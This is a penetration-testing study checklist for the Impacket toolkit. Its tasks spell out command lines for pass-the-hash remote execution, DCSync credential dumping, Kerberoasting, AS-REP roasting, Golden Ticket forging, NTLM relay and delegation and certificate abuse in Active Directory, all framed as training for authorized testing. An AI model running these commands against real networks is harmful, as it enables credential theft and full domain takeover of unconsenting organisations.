# 🐍 Impacket: Complete Mastery Checklist

> **What is Impacket?** Impacket is a collection of Python classes and tools for working with Windows network protocols: SMB, MSRPC, LDAP, Kerberos, NTLM, WMI, DCOM, and more. It enables remote command execution, credential extraction, Kerberos attacks, and Active Directory exploitation — all from a Linux attacker machine.
>
> **Why does it exist?** Attacking Windows/Active Directory environments from Linux requires deep protocol implementation. Impacket provides Python-native implementations of Windows protocols, enabling offensive security operations without needing a Windows attack machine.
>
> **When to use it:** Active Directory penetration testing. Windows remote command execution (psexec, wmiexec, smbexec). Kerberos attacks (Kerberoasting, AS-REP roasting, Silver/Golden tickets). Credential extraction (secretsdump). SMB share enumeration. NTLM relay attacks. Pass-the-hash.
>
> **When to avoid it:** Linux-only environments (no Windows/AD). When you need a GUI (use RDP or Evil-WinRM instead). When CrackMapExec provides a simpler interface for the same task. Web application testing.
>
> **What mastering Impacket unlocks:** Complete Active Directory attack capability from Linux. OSCP/OSEP/CRTP exam readiness. Understanding of Windows protocols at the implementation level. The ability to attack Windows without Windows.

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals & AD Concepts | 5 | 3–4 hours |
| 2 | Core Tools (exec, secretsdump) | 8 | 5–8 hours |
| 3 | Intermediate (Kerberos, Relay) | 6 | 5–7 hours |
| 4 | Advanced (Delegation, DCSync) | 5 | 5–7 hours |
| 5 | Tool Integration | 4 | 2–4 hours |
| 6 | Practical Labs | 4 | 6–10 hours |
| 7 | Methodology & Limitations | 3 | 2–3 hours |
| 8 | Mastery Challenges | 3 | 4–6 hours |
| | **Total** | **38** | **~32–49 hours** |

**Prerequisites:** TCP/IP networking. Understanding of Windows authentication (NTLM, Kerberos). Basic Active Directory concepts (domains, domain controllers, users, groups, SPNs). Python basics (Impacket is Python-based).

**Alternatives:** CrackMapExec/NetExec (wrapper around many Impacket techniques with simpler syntax), Evil-WinRM (WinRM shell), Rubeus (Kerberos attacks from Windows), Mimikatz (credential extraction from Windows), PowerView (AD enumeration from Windows), BloodHound (AD path visualization).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Understand Impacket's Role in AD Attacks

- [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand that Impacket is a TOOLKIT of individual scripts, each implementing different Windows protocol interactions. It's not one tool — it's 50+ tools sharing a common library. |
| **Skills Learned** | The Impacket toolkit structure, key tools and their purposes, where Impacket fits in AD attack chains, why protocol-level access from Linux matters for pentesters. |
| **Practical Exercise** | List Impacket tools: `ls /usr/share/impacket/` or `impacket-` followed by tab-completion. Categorize the top 15 tools by function: remote execution, credential extraction, Kerberos attacks, SMB operations, NTLM relay, enumeration. |
| **Expected Output** | Tool inventory categorized by function. Understanding that each script does one thing well. |
| **Common Mistakes** | Thinking Impacket is a single tool (it's a collection). Not knowing which script to use for which task. Not understanding that most scripts need credentials (password, hash, or Kerberos ticket) to work. |

---

### Task 1.2 — Installation & Python Environment

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Verify Impacket installation and understand the naming convention. On Kali, tools are prefixed with `impacket-` (e.g., `impacket-psexec`). |
| **Practical Exercise** | `impacket-psexec --help`, `impacket-secretsdump --help`, `impacket-GetNPUsers --help`. If not installed: `pip3 install impacket` or `apt install python3-impacket`. |
| **Expected Output** | All key tools accessible and functional. Understanding of the command naming convention. |

---

### Task 1.3 — Authentication Methods in Impacket

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand the three authentication methods used across all Impacket tools: password, NTLM hash (pass-the-hash), and Kerberos ticket. Nearly every tool accepts all three. |
| **Syntax Patterns** | Password: `impacket-psexec domain/user:password@target`. Hash: `impacket-psexec domain/user@target -hashes LM:NTLM`. Kerberos: `impacket-psexec domain/user@target -k -no-pass` (uses ccache ticket). |
| **Expected Output** | Understanding that pass-the-hash means you DON'T need to crack the password — the hash IS the credential. Understanding of Kerberos ticket-based authentication. |
| **Common Mistakes** | Forgetting the domain prefix (`domain/user` not just `user`). Wrong hash format (`LM:NTLM` — if LM is unknown, use `aad3b435b51404eeaad3b435b51404ee` as the LM portion). Not setting `KRB5CCNAME` environment variable for Kerberos authentication. |

---

### Task 1.4 — Active Directory Fundamentals for Impacket

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand the AD concepts needed to use Impacket effectively: Domain Controller, Domain Users/Admins, SPNs (Service Principal Names), Kerberos TGT/TGS, NTLM authentication, SMB signing, LDAP, Group Policy. |
| **Practical Exercise** | Draw a diagram: User authenticates → Domain Controller issues TGT → User requests TGS for a service → Service validates ticket. Label where Kerberoasting, AS-REP roasting, Pass-the-Ticket, and Golden Ticket attacks occur. |
| **Expected Output** | Kerberos authentication flow diagram with attack points labeled. Understanding of the AD concepts that Impacket tools exploit. |

---

### Task 1.5 — Target Identification for Impacket

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Identify Windows/AD targets suitable for Impacket attacks: domain controllers (port 88 Kerberos, 389 LDAP, 445 SMB), member servers (445 SMB, 135 RPC, 5985 WinRM), workstations. |
| **Practical Exercise** | From Nmap results: identify DCs (`nmap --script smb-os-discovery <target>`), identify domain name, identify open ports for Impacket tools. |
| **Expected Output** | Target inventory with: hostname, IP, role (DC/member/workstation), open ports relevant to Impacket. |

---

# PHASE 2: CORE TOOLS

---

### Task 2.1 — psexec.py: Remote Command Execution

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `psexec.py` for remote command execution on Windows targets. Understand how it works: uploads a service binary via SMB, creates a Windows service, executes it, returns output. |
| **Syntax** | `impacket-psexec domain/admin:Password123@<target>`. With hash: `impacket-psexec domain/admin@<target> -hashes :NTLM_HASH`. |
| **Real-World Scenario** | You have domain admin credentials. Use psexec to get a SYSTEM shell on any domain-joined machine for post-exploitation, credential extraction, or lateral movement. |
| **Expected Output** | SYSTEM-level interactive command shell on the target. Understanding that psexec creates artifacts (service, executable) that AV/EDR may detect. |
| **Common Mistakes** | Using psexec against a target where AV blocks the uploaded executable. Not understanding that psexec requires SMB write access (port 445) AND admin privileges. Forgetting the domain prefix. Not knowing that psexec gives SYSTEM (not the authenticated user's context). |

---

### Task 2.2 — wmiexec.py: Stealthier Execution

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `wmiexec.py` for remote execution via WMI (Windows Management Instrumentation). More stealthy than psexec because it doesn't upload a binary or create a service. |
| **Syntax** | `impacket-wmiexec domain/admin:Password123@<target>`. Semi-interactive shell — each command is a new WMI process. |
| **Real-World Scenario** | When psexec is blocked by AV/EDR, wmiexec often works because it uses legitimate WMI infrastructure. |
| **Expected Output** | Command execution without dropping files to disk. Shell as the authenticated user (not SYSTEM like psexec). |
| **Common Mistakes** | Expecting a fully interactive shell (wmiexec is semi-interactive — each command is independent). Not understanding that wmiexec executes as the authenticated user, not SYSTEM. WMI may be blocked by firewall rules (DCOM uses dynamic ports). |

---

### Task 2.3 — smbexec.py: SMB-Based Execution

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `smbexec.py` as another remote execution method. It creates a service that writes output to a file share, then reads it back — no binary upload. |
| **Syntax** | `impacket-smbexec domain/admin:Password123@<target>`. |
| **Expected Output** | SYSTEM shell via SMB service creation. Understanding the trade-offs: no binary upload, but creates a service (logged). |

---

### Task 2.4 — secretsdump.py: Credential Extraction

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `secretsdump.py` to remotely extract credentials from a Windows target: SAM database (local accounts), LSA secrets, cached domain credentials, and NTDS.dit (all domain hashes from a Domain Controller — DCSync). |
| **Syntax** | Local hashes: `impacket-secretsdump domain/admin:Password123@<target>`. DCSync (from DC): `impacket-secretsdump domain/admin:Password123@<DC> -just-dc-ntlm`. Just DC users: `impacket-secretsdump domain/admin:Password123@<DC> -just-dc-user krbtgt`. |
| **Real-World Scenario** | You've compromised a Domain Admin account. Run secretsdump against the DC to extract every domain user's NTLM hash. This is the "keys to the kingdom" moment. |
| **Expected Output** | SAM hashes from local targets. ALL domain NTLM hashes from a DC (via DCSync). LSA secrets (may contain service account passwords in plaintext). |
| **Common Mistakes** | Running against a member server expecting all domain hashes (you need a Domain Controller for DCSync). Not having Domain Admin or DCSync-equivalent privileges. Not saving output to file (`-outputfile hashes`). Not understanding that DCSync mimics domain replication — it doesn't access the filesystem directly. |

---

### Task 2.5 — smbclient.py: SMB Share Access

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `smbclient.py` to list and access SMB shares. Browse files, upload/download files, and search for sensitive data. |
| **Syntax** | `impacket-smbclient domain/user:Password123@<target>`. Commands: `shares` (list shares), `use <share>`, `ls`, `get <file>`, `put <file>`, `cd <dir>`. |
| **Expected Output** | SMB shares enumerated. Sensitive files downloaded (configs, scripts, backups). |
| **Common Mistakes** | Not trying null session first (`impacket-smbclient -no-pass <target>`). Not checking all shares (SYSVOL and NETLOGON on DCs may contain Group Policy Preferences with stored credentials). |

---

### Task 2.6 — GetNPUsers.py: AS-REP Roasting

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `GetNPUsers.py` to find AD accounts with "Do not require Kerberos preauthentication" enabled. These accounts' hashes can be requested WITHOUT any credentials (AS-REP Roasting). |
| **Syntax** | With user list: `impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip <DC> -format hashcat -outputfile asrep-hashes.txt`. Without credentials: `impacket-GetNPUsers domain/ -no-pass -usersfile users.txt -dc-ip <DC>`. With credentials (enumerate automatically): `impacket-GetNPUsers domain/user:password -dc-ip <DC> -request`. |
| **Real-World Scenario** | You have no credentials but know the domain name. Request AS-REP hashes for accounts with pre-auth disabled → crack offline with Hashcat (`-m 18200`). |
| **Expected Output** | AS-REP hashes for vulnerable accounts. Hashes in Hashcat-ready format. Cracked passwords revealing initial AD foothold. |
| **Common Mistakes** | Not having a user list (use `kerbrute` or LDAP enumeration to find valid usernames first). Targeting the wrong DC IP. Not using `-format hashcat` (default format may not work with Hashcat). |

---

### Task 2.7 — GetUserSPNs.py: Kerberoasting

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use `GetUserSPNs.py` to perform Kerberoasting: request Kerberos TGS tickets for service accounts, extract the encrypted ticket hash, and crack it offline. Requires valid domain credentials (any user). |
| **Syntax** | `impacket-GetUserSPNs domain/user:password -dc-ip <DC> -request -outputfile kerberoast-hashes.txt`. |
| **Real-World Scenario** | You have ANY domain user account. Kerberoast to request service account tickets → crack offline → service accounts often have weak passwords AND high privileges. |
| **Expected Output** | TGS hashes for all accounts with SPNs. Cracked service account passwords (Hashcat `-m 13100`). |
| **Common Mistakes** | Not having ANY domain credentials (Kerberoasting requires at least a low-privilege domain account). Not targeting service accounts specifically (user accounts rarely have SPNs). Not cracking the hashes immediately (service accounts with SPNs are prime targets). |

---

### Task 2.8 — lookupsid.py: SID Enumeration

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Enumerate domain users, groups, and computers by brute-forcing SID (Security Identifier) values. Works with null sessions or any credentials. |
| **Syntax** | `impacket-lookupsid domain/user:password@<target> 20000` (enumerate SIDs up to 20000). Null session: `impacket-lookupsid guest@<target> -no-pass`. |
| **Expected Output** | Complete user and group enumeration via SID brute-force. |

---

# PHASE 3: INTERMEDIATE — KERBEROS & RELAY

---

### Task 3.1 — ticketer.py: Golden & Silver Tickets

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Create Golden Tickets (forged TGT using krbtgt hash — complete domain compromise) and Silver Tickets (forged TGS for specific services). |
| **Syntax** | Golden Ticket: `impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain <domain> administrator`. Silver Ticket: `impacket-ticketer -nthash <service-hash> -domain-sid <SID> -domain <domain> -spn <SPN> administrator`. Use ticket: `export KRB5CCNAME=administrator.ccache && impacket-psexec domain/administrator@<target> -k -no-pass`. |
| **Expected Output** | Forged Kerberos tickets used for authentication. Understanding of why Golden Ticket = persistent domain compromise (valid until krbtgt password changes TWICE). |
| **Common Mistakes** | Not having the krbtgt NTLM hash (need DCSync first). Wrong domain SID. Not exporting `KRB5CCNAME` before using the ticket. Not understanding that Golden Tickets survive password resets (except krbtgt). |

---

### Task 3.2 — ntlmrelayx.py: NTLM Relay Attacks

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Relay captured NTLM authentication to a different target. When SMB signing is not required, authentication from one server can be relayed to another for code execution. |
| **Syntax** | `impacket-ntlmrelayx -t <target> -smb2support -i` (relay to target, get interactive shell). With command: `impacket-ntlmrelayx -t <target> -smb2support -c "whoami"`. Trigger authentication: use Responder, PetitPotam, PrinterBug, or social engineering. |
| **Expected Output** | Code execution on a target using relayed authentication. Understanding of the NTLM relay attack chain. |
| **Common Mistakes** | Relaying to a target with SMB signing required (relay fails). Using Responder's SMB server at the same time as ntlmrelayx (they conflict — disable Responder's SMB). Not understanding the trigger mechanism (you need someone to authenticate TO you). |

---

### Task 3.3 — Responder + ntlmrelayx Combo

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Responder to capture NTLM authentication requests (via LLMNR/NBT-NS poisoning) and relay them to targets using ntlmrelayx. |
| **Syntax** | Responder (disable SMB/HTTP): `sudo responder -I eth0 -wrf -P -v` (edit Responder.conf: `SMB = Off`, `HTTP = Off`). ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support`. |
| **Expected Output** | Relayed authentication resulting in code execution or credential dumping on target machines. |

---

### Task 3.4 — getTGT.py & getST.py: Ticket Manipulation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Request Kerberos TGTs and Service Tickets programmatically. Used for pass-the-ticket, overpass-the-hash, and constrained delegation attacks. |
| **Syntax** | Get TGT: `impacket-getTGT domain/user:password -dc-ip <DC>`. Get TGT with hash: `impacket-getTGT domain/user -hashes :NTLM -dc-ip <DC>`. Get Service Ticket: `impacket-getST domain/user:password -spn cifs/<target> -dc-ip <DC>`. Use: `export KRB5CCNAME=user.ccache`. |
| **Expected Output** | `.ccache` ticket files for Kerberos authentication. Understanding of overpass-the-hash (use NTLM hash to get Kerberos TGT). |

---

### Task 3.5 — addcomputer.py & rbcd.py: Resource-Based Delegation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Exploit Resource-Based Constrained Delegation (RBCD) to impersonate administrators on target computers. This is one of the most powerful AD attack techniques. |
| **Syntax** | Add computer: `impacket-addcomputer domain/user:password -computer-name FAKE$ -computer-pass Passw0rd -dc-ip <DC>`. Configure RBCD: `impacket-rbcd domain/user:password -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip <DC> -action write`. Get ticket: `impacket-getST domain/FAKE$:Passw0rd -spn cifs/TARGET.domain.local -impersonate administrator -dc-ip <DC>`. Use: `export KRB5CCNAME=administrator.ccache && impacket-psexec domain/administrator@TARGET -k -no-pass`. |
| **Expected Output** | Administrator access on the target through delegation abuse. |

---

### Task 3.6 — dcomexec.py & atexec.py: Alternative Execution

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Know alternative remote execution methods: `dcomexec.py` (via DCOM/MMC20), `atexec.py` (via scheduled tasks). Each bypasses different defenses. |
| **Syntax** | DCOM: `impacket-dcomexec domain/admin:Password@<target>`. Scheduled task: `impacket-atexec domain/admin:Password@<target> "whoami"`. |
| **Expected Output** | Code execution via alternative protocols when SMB-based methods are blocked. |

---

# PHASE 4: ADVANCED

---

### Task 4.1 — DCSync Attack Deep Dive

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Perform a full DCSync attack: extract all domain hashes by simulating domain controller replication. Understand the prerequisites (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions). |
| **Practical Exercise** | `impacket-secretsdump domain/admin:password@<DC> -just-dc` → extract ALL hashes, Kerberos keys, and cleartext passwords (if stored with reversible encryption). Target specific user: `-just-dc-user domain\krbtgt`. |

---

### Task 4.2 — Pass-the-Hash & Overpass-the-Hash

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use extracted NTLM hashes for authentication without cracking them (pass-the-hash). Convert NTLM hash to Kerberos TGT (overpass-the-hash) for environments that require Kerberos. |
| **Syntax** | PtH: `impacket-psexec domain/admin@<target> -hashes :NTLM_HASH`. OPtH: `impacket-getTGT domain/admin -hashes :NTLM_HASH -dc-ip <DC>` → `export KRB5CCNAME=admin.ccache` → `impacket-psexec domain/admin@<target> -k -no-pass`. |

---

### Task 4.3 — LDAP Enumeration with ldapdomaindump

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Impacket's LDAP capabilities alongside `ldapdomaindump` to extract comprehensive AD information: users, groups, computers, GPOs, trusts, and organizational units. |
| **Syntax** | `ldapdomaindump -u 'domain\user' -p 'password' <DC> -o ldap-dump/`. Generates HTML reports of all AD objects. |

---

### Task 4.4 — Abusing Group Policy Preferences (GPP)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Find and decrypt Group Policy Preferences passwords stored in SYSVOL. The AES key was published by Microsoft — all GPP passwords can be decrypted. |
| **Syntax** | `impacket-Get-GPPPassword domain/user:password@<DC>`. Or manually: access `\\DC\SYSVOL\domain\Policies\*\Machine\Preferences\Groups\Groups.xml` → decrypt cpassword with `gpp-decrypt`. |

---

### Task 4.5 — Certificate Abuse (ESC Attacks)

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Impacket with Certipy for Active Directory Certificate Services (AD CS) attacks. ESC1-ESC8 vulnerabilities can lead to domain compromise through certificate template abuse. |
| **Tools** | `certipy find -u user@domain -p password -dc-ip <DC>` (find vulnerable templates). `certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate -upn administrator@domain` (request cert as admin). `certipy auth -pfx administrator.pfx -dc-ip <DC>` (authenticate with forged cert → get NTLM hash). |

---

# PHASE 5–8: INTEGRATION, LABS & MASTERY

---

### Task 5.1 — BloodHound → Impacket Pipeline

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| **Workflow** | BloodHound identifies attack path → Impacket executes each step: Kerberoast (GetUserSPNs) → crack hash → lateral movement (psexec) → DCSync (secretsdump). |

---

### Task 5.2 — Nmap → Impacket Pipeline

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Workflow** | Nmap identifies port 445/88/389 → Impacket enumerates (smbclient, lookupsid) → exploits (psexec, secretsdump). |

---

### Task 5.3 — Impacket → Hashcat Pipeline

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| **Workflow** | secretsdump extracts NTLM hashes → Hashcat cracks them (`-m 1000`) → cracked passwords used for further access. GetUserSPNs extracts Kerberoast hashes → Hashcat (`-m 13100`). |

---

### Task 5.4 — CrackMapExec as an Impacket Frontend

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| **Workflow** | CrackMapExec wraps many Impacket functions with simpler syntax: `crackmapexec smb <targets> -u user -p pass --shares` (enumerate shares), `--sam` (dump SAM), `--ntds` (DCSync). Use CME for speed, Impacket scripts for advanced/custom attacks. |

---

### Lab 6.1 — Beginner: SMB Enumeration

- [ ] **Completed** · ⭐⭐ Beginner · ⏱️ 45 min

| **Scenario** | Enumerate SMB shares, users, and groups on a Windows target using smbclient.py and lookupsid.py. |
| **Success Criteria** | Share list complete. User list extracted. Group memberships documented. |

---

### Lab 6.2 — Intermediate: Remote Execution Methods

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 60 min

| **Scenario** | Get remote command execution using three different methods: psexec, wmiexec, and smbexec. Compare their artifacts and detection profiles. |
| **Success Criteria** | Shell access via all three methods. Comparison table documenting: execution user, artifacts, detection risk, speed. |

---

### Lab 6.3 — Advanced: Kerberoast to Domain Admin

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 120 min

| **Scenario** | From a low-privilege domain account: Kerberoast → crack service account hash → lateral movement → DCSync → domain admin. |
| **Success Criteria** | Full attack chain from low-priv to domain admin. All hashes extracted. Complete documentation. |

---

### Lab 6.4 — Expert: Full AD Compromise

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 180 min

| **Scenario** | Complete AD penetration test: enumeration → Kerberoasting → AS-REP roasting → credential cracking → lateral movement → DCSync → Golden Ticket → persistence. All using Impacket. |
| **Success Criteria** | Every major Impacket tool used. Complete attack chain documented. Golden Ticket persistence demonstrated. |

---

### Task 7.1 — Impacket in the Kill Chain

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Objective** | Weaponization (payload via msfvenom), Exploitation (psexec/wmiexec), Installation (persistence), Lateral Movement (pass-the-hash, pivoting), Actions on Objectives (secretsdump, DCSync). |

---

### Task 7.2 — Impacket Limitations

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min

| **Key Limitations** | Windows/AD only (useless on Linux targets). Requires network access to target ports (445, 135, 88, 389). Many tools require admin credentials. Psexec is detected by most AV/EDR. Not a GUI tool. Python dependency issues can occur. |

---

### Task 7.3 — Legal & OPSEC Considerations

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 10 min

| **Key Points** | DCSync triggers replication events in Windows Event Log. Psexec creates services (Event ID 7045). Kerberoasting generates TGS requests (Event ID 4769). NTLM relay requires specific network conditions. Always have authorization for AD attacks. |

---

### Challenge 8.1 — AD Attack Chain Documentation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 120 min

| **Scenario** | Document a complete AD attack chain using only Impacket tools. Include: initial enumeration, foothold, lateral movement, privilege escalation, domain dominance, persistence. |

---

### Challenge 8.2 — Impacket Automation Script

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 120 min

| **Scenario** | Write a Python script using Impacket's libraries (not the CLI tools) to automate: SMB share enumeration → interesting file search → credential extraction → report generation. |

---

### Challenge 8.3 — Teach Impacket

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Prepare a 20-minute AD attack workshop using Impacket: authentication methods, remote execution, Kerberoasting, secretsdump. Live demo of a complete attack chain. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can authenticate with password, hash, and Kerberos ticket | ☐ |
| Can execute commands via psexec, wmiexec, smbexec | ☐ |
| Can extract credentials with secretsdump (SAM, LSA, NTDS) | ☐ |
| Can perform Kerberoasting and AS-REP Roasting | ☐ |
| Can create and use Golden/Silver Tickets | ☐ |
| Can perform NTLM relay attacks | ☐ |
| Can enumerate AD via LDAP and SMB | ☐ |
| Can integrate Impacket with BloodHound and Hashcat | ☐ |
| Can teach AD attacks with Impacket | ☐ |

---

## 🎯 Interview Questions

1. What is the difference between psexec, wmiexec, and smbexec?
2. How does pass-the-hash work and why don't you need to crack the password?
3. What is Kerberoasting and what makes it dangerous?
4. How does secretsdump extract domain hashes from a DC (DCSync)?
5. What is a Golden Ticket and why is it persistent?
6. Explain NTLM relay attacks and their prerequisites.
7. What is AS-REP Roasting and when can it be performed without credentials?
8. How do you convert an NTLM hash to a Kerberos TGT (overpass-the-hash)?
9. What are the OPSEC implications of running psexec?
10. When would you use CrackMapExec instead of Impacket directly?
